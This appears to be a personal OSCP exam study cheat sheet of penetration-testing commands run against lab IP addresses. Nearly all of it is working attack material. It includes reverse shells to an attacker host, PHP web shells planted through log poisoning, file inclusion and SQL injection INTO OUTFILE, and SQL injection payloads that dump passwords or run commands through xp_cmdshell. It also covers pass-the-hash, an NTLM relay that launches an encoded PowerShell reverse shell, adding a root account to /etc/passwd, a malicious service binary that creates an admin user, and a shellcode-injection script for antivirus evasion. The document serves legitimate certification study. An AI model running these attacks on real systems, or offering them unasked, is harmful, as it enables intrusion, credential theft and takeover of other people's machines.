# OSCP Notes

## Vital Tools

* wpscan https://github.com/wpscanteam/wpscan

## Nmap

`sudo nmap -sS -sV --script=default,vuln -p- -T5 10.10.10.86`

## Reverse Shell 

### General

```$ bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"```

```$ nc -nvlp 4444```

### Meterpreter Listener

`msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.50.1;set LPORT 443;run;"`

## RDP
`sudo xfreerdp /u:"jason" /drive:/root /v:192.168.247.203`

# Web

## File Upload Vuln

Upload Web shells...

Overwrite files by calling the filename "../../../../../../root/.ssh/authorized_keys"

Then maybe try to log in?

## Local File Inclusion

* Attempt to read the access log ->
```curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log```

### Log poisoning

* Does the applicatoin write to the log? Maybe add a php web shell to your headers...
 ```User-Agnet Mozilla/5.0 <?php echo system($_GET['cmd']); ?>```

### PHP (and Data) Wrappers

Gives the ability to read files... even php files. 

```curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php```

Will yield this... which decoded is the php code

```
<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgICA8dGl0bGU+TWFpbn...
dF9lcnJvcik7Cn0KZWNobyAiQ29ubmVjdGVkIHN1Y2Nlc3NmdWxseSI7Cj8+Cgo8L2JvZHk+CjwvaHRtbD4K
```

Or we can achieve command injection using a data wrapper:

```http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>```

### Remote File Inclusion

Reach out and touch your own hosted webshell

```curl "http://mountaindesserts.com/meteor/index.php?page=http://[my-ipaddress]/simple-backdoor.php&cmd=ls"```

## SQL Injection

### Connect and Nav

Login to MySQL using mysql: 

```$ mysql -u root -p'root' -h 192.168.50.16 -P 3306```

|MySQL Commands| 
|----| 
|  > select version();   |
|  > select system_user();   |
|  > show databases;   |

Login to MSSQL using impacket-mssqlclient: 

```$ impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth```

|MSSQL Commands| 
|----| 
|  > SELECT @@version;   |
|  > SELECT name FROM sys.databases;   |
|  > SELECT * FROM offsec.information_schema.tables;   |
| > select * from offsec.dbo.users; |


### GENERAL Attack Payloads:

```' or 1=1 in (select @@version) -- //```

```' OR 1=1 in (SELECT * FROM users) -- //```

```' or 1=1 in (SELECT password FROM users) -- //```

```' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //```


### UNION Attack Payloads:


```%' UNION SELECT database(), user(), @@version, null, null -- //```

```' UNION SELECT null, null, database(), user(), @@version  -- //```

```' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //```

```' UNION SELECT null, username, password, description, null FROM users -- //```


### Execute Commands

MSSQL Commands: 

```$ impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth```

```> EXECUTE sp_configure 'show advanced options', 1;```

```> RECONFIGURE;```

```> EXECUTE sp_configure 'xp_cmdshell',1;```

```> RECONFIGURE;```

```> EXECUTE xp_cmdshell 'whoami';```

### Write a Webshell Payloads:

```' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //```

### Command Execution with Stacked Queries:

```
DROP TABLE IF EXISTS cmd_exec;          -- [Optional] Drop the table you want to use if it already exists
CREATE TABLE cmd_exec(cmd_output text); -- Create the table you want to hold the command output
COPY cmd_exec FROM PROGRAM 'nc -l -p -e /bin/sh';        -- Run the system command via the COPY FROM PROGRAM function
SELECT * FROM cmd_exec;                 -- [Optional] View the results
DROP TABLE IF EXISTS cmd_exec;          -- [Optional] Remove the table
```
### SQL Map 

Usage Commands:

* Note -p specifies a parameter we want to test
* Note --os-shell tries to get a shell on target

```sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user --dump```

OR intercept a Post request and use that to pass parameters

```sqlmap -r POST.req -p item  --os-shell  --web-root "/var/www/html/tmp"```


# WordPress

## Plugins

Remember, WP Plugins are exploitable. Verisons can be found in the source code

### Get WP Plugins

```wpscan --url {url_here}```

### WP Plugin CVEs

`https://github.com/Hacker5preme/Exploits/blob/main/README.md`

# SMB

Password guess: `crackmapexec smb 192.168.247.227 -u nadine -p /home/kali/rockyou.txt`

# Password Attacks

## Password Cracking

KeePass to hash -> `keepass2john [name].kdbx > hashfile`

ssh2john to hash -> `ssh2john [name] > hashfile`

Best Rule for cracking: `https://github.com/Unic0rn28/hashcat-rules/blob/main/rules_full.7z`

Hashcat: `hashcat -a 0 -m 13400 pass.txt /home/kali/rockyou.txt -r /home/kali/Downloads/rules_full.rule`

## Password Guessing

Hydra HTTP Post: `hydra -l admin -P /home/kali/rockyou.txt 192.168.245.89 http-post-form "/wp-login:log=^USER^&pwd=^PASS^:S=302"`
Hydra FTP: `hydra -l "itadmin" -P /home/kali/rockyou.txt ftp://192.168.235.202`
Hydra HTTP Get: `hydra -l admin -P ./rockyou.txt 192.168.235.201  http-get /`

## NTLM & Mimikatz

Powershell commands to extract hashes:
```
privilege::debug
token::elevate
lsadump::sam
```

## Pass the Hash

1. Obtain the hash of a Windows user
2. Log in with hash:

```
smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
or
impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
or
impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
```

## NTLMv2 Responder Capture and Crack

1. Check IP interfaces: `ip a`
2. Run Responder with an interface: `sudo responder -I tap0`
3. Attempt to cennect to Responder's SMB on our Kali machine from the target `dir \\192.168.119.2\test`
4. A hash should appear on the Responder output

### NTLMv2 Relay Attack

![ntlm_relay_basic](https://github.com/caadams4/OSCP_notes/assets/79220528/2ea911c5-24ed-44d9-8991-390d08730e18)

* Terminal 1: Set up negotation ntlm relay with PS b64 rev shell one-liner `impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc JABjAGwAaQBlAG4AdA..."`
* Terminal 2 (Server): Set up listener `nc -lvnp 9090`
* Terminal 3 (Client): Connect to shell on a comprimised machine and visit fake smb `dir \\192.168.119.2\test`
* Terminal 2 (Server): Establishes shell on server 

### SMB Relay

Similar to Responder Capture, but change filename in an uploader to `\\\\[responder-ip]\\test`

# Privilege Escalation

## Linux

### Automated Enumeration

Use `/usr/bin/unix-privsc-check` on the target with `./unix-privesc-check standard > output.txt`

### Manual Enumeration 

Gather OS/User info with commands:
```
id
cat /etc/passwd
hostname
cat /etc/issue
cat /etc/os-release
uname -a
```

List running processes: `ps -aux`

Print routing table: `routel`

Network details: `ss -anp`

List cron all jobs: `ls -lah /etc/cron*`

Edit user Crontab file: `crontab -l`

Edit Sudo Crontab file: `sudo crontab -l`

List Installed Debian Packages: `dpkg -l`

List Writable Directories: `find / -writable -type d 2>/dev/null`

List Mounted Drives: `cat /etc/fstab`

List Available Disks: `lsblk`

List Kernel Modules: `lsmod` or `/sbin/modinfo libata`

List SUID Binaries: `find / -perm -u=s -type f 2>/dev/null`

-------------------------------------------------------

### Inspecting User Trails

Check Env Vars: `env`

Check User Login Script: `cat ~/.bashrc`

Create Custom Wordlist for Possible Passwds: `crunch 6 6 -t Lab%%% > wordlist` yields Lab000-Lab999

SSH Guessing with custom Wordlist: `hydra -l eve -P wordlist  192.168.50.214 -t 4 ssh -V`

Sudoer info: `sudo -l`

### Inspecting Service Footprints

Watch process (ps) spawns: `watch -n 1 "ps -aux | grep pass"`

Capture packets to target: `sudo tcpdump -i lo -A | grep "pass"`

### Cron Job Abuse

List cron all jobs: `ls -lah /etc/cron*`

Search for Cronjob evidence: `grep "CRON" /var/log/syslog` or `cat /var/log/cron.log`

### Make Yourself a User

Is `/etc/passwd` writable??

Make a `/etc/passwd` entry:

```
openssl passwd w00t
echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
su root2
```

### Suid Binaries

Find SUIDs: `find / -perm -u=s -type f 2>/dev/null`

Find Misconfigs: `/usr/sbin/getcap -r / 2>/dev/null`

### Sudo Abuse

Find nopass SUDO: `sudo -l`

Now, lets say `sudo -l` yields `/usr/bin/apt-get`

GTFO bins gives the lines to privesc: 
```
sudo apt-get changelog apt
!/bin/sh
```
If fail, check for apparmor denial: `cat /var/log/syslog | grep tcpdump`

### Kernel Vulnerabilities

Gather info: 
```
cat /etc/issue
uname -r
arch
```
Search for Exploits: `searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation"   | grep  "4." | grep -v " < 4.4.0" | grep -v "4.8"`

Try to compile exploits ON THE TARGET if possible!



## Windows

### Understanding Security Identifier (SID)

Windows assigns an SID to each entity (or principle) tha tauthenticates with Windows. Local objects are assigned an SId by the Local Security Authority and domain objects are assigned an SID from a Domain Controller.

SID Structure: `S-1-X-Y` where X is the identifying authority and Y is the user's RID

### Enumerate and Gather Info

Always enumerate to find this info
```
- Username and hostname
- Group memberships of the current user
- Existing users and groups
- Operating system, version and architecture
- Network information
- Installed applications
- Running processes
```

Get the current username `> whoami` and group membership `> whoami /groups` or `> net user steve`

Get all local user info `> Get-LocalUser`

Get all non-standard groups info `> Get-LocalGroup`

Get example group `adminteam` info `> Get-LocalGroupMember adminteam` 

Get Administrator group info `> Get-LocalGroupMember Administrators`

Get OS System info `> systeminfo`

Get network IP  info `> ipconfig /all`

Get network routing table info `> ipconfig /all`

Get network connection info `> netstat -ano`

Get install applicaitons `> Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname`

...and `> Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname` 

Get running process info `> Get-Process`

Get specific process information `>  Get-Process | Select-Object -Property Path, Name | Where-Object -Property Name -Like "*ProCeSsNaMEHeRE*"`

### Find Sensitive Files

Find `.kdbx` file in C drive `> Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue`

Find all text and ini config files in xamp `> Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue`

Find all user files that may contian info in user folder `> Get-ChildItem -Path C:\Users\mac\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue`

Print file to terminal `type C:\xampp\passwords.txt`

Run cmd as another user `> runas /user:backupadmin cmd`

### Harvest Information

Locate Powershell History file `> (Get-PSReadlineOption).HistorySavePath`

Examine Transcripts `> type C:\Users\Public\Transcripts\transcript01.txt`

Build PSCredential Object
```
> $password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force
> $cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)
> Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
```

Windows `evil-winrm` shell using `> evil-winrm -i 192.168.50.220 -u daveadmin -p "qwertqwertqwert123\!\!"`

### Automating Enumeration with WinPEAS

ON ATTACKER MACHINE: 

Copy to local dir `$ cp /usr/share/peass/winpeas/winPEASx64.exe .`

Host HTTP Serv for file transfer `$ python3 -m http.server 80`

ON VICTIM Machine: 

Download WinPEAS from Attacker HTTP `> iwr -uri http://192.168.45.152/winPEASx64.exe -Outfile winPEAS.exe`

Execute WinPEAS `> ./WinPEAS.exe`

### Service Binary Hijacking

Get a list of services and their binary path `> Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}`

Get permissions mask `> icacls "C:\xampp\apache\bin\httpd.exe"` or `icacls "C:\xampp\mysql\bin\mysqld.exe"`
```
Example...

PS C:\Users\dave> icacls "C:\xampp\mysql\bin\mysqld.exe"
C:\xampp\mysql\bin\mysqld.exe NT AUTHORITY\SYSTEM:(F)
                              BUILTIN\Administrators:(F)
                              BUILTIN\Users:(F)

Key: 
Mask 	Permissions
F 	   Full access
M 	   Modify access
RX 	  Read and execute access
R 	   Read-only access
W 	   Write-only access
```

So create a c file `adduser.c` that creates a user and adds to local admin

```
int main ()
{
  int i;
  
  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  
  return 0;
}
```

Compile `$ x86_64-w64-mingw32-gcc adduser.c -o adduser.exe`

Transfer `> iwr -uri http://192.168.119.3/adduser.exe -Outfile adduser.exe`

Replace old bin `> move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe`

Restart the service `> net stop mysql` or restart the machine `> shutdown /r /t 0 `

### Automating Service Binary theft with PowerUp 

1. `$ cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .`
2. `$ python3 -m http.server 80`
3. `> iwr -uri http://192.168.119.3/PowerUp.ps1 -Outfile PowerUp.ps1`
4. `> powershell -ep bypass`
5. `> . .\PowerUp.ps1`
6. `> Get-ModifiableServiceFile`
7. `> Install-ServiceBinary -Name 'mysql'`



# Anti-virus Evasion

## Automating Process Injection and Evasion with Sheller

We can take a binign app... like an app installer... and put a malicious payload into it! 

Add Required `wine32` and `sheller`
```
kali$ sudo apt install shellter
kali$ sudo apt install wine
root$ dpkg --add-architecture i386 && apt-get update && apt-get install wine32
```

## Remote Process Memory Injection Reverse shell to 443 

Starter Script called `bypass.ps1` ... now craft your payload with msfvenom!

Shellcode: `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -f powershell -v sc`

bypass.ps1
```
$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';

$yeet1 = 
  Add-Type -memberDefinition $code -Name "yeetWin32" -namespace Win32Functions -passthru;

[Byte[]];
[Byte[]]$yeet2 = <place your SHELLCODE here>;

$size = 0x1000;

if ($yeet2.Length -gt 0x1000) {$size = $yeet2.Length};

$x = $yeet1::VirtualAlloc(0,$size,0x3000,0x40);

for ($i=0;$i -le ($yeet2.Length-1);$i++) {$yeet1::memset([IntPtr]($x.ToInt32()+$i), $yeet2[$i], 1)};

$yeet1::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
```

Didn't work? modify the execution policy. 

1. > Get-ExecutionPolicy -Scope CurrentUser
2. > Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
3. : A
4. > Get-ExecutionPolicy -Scope CurrentUser

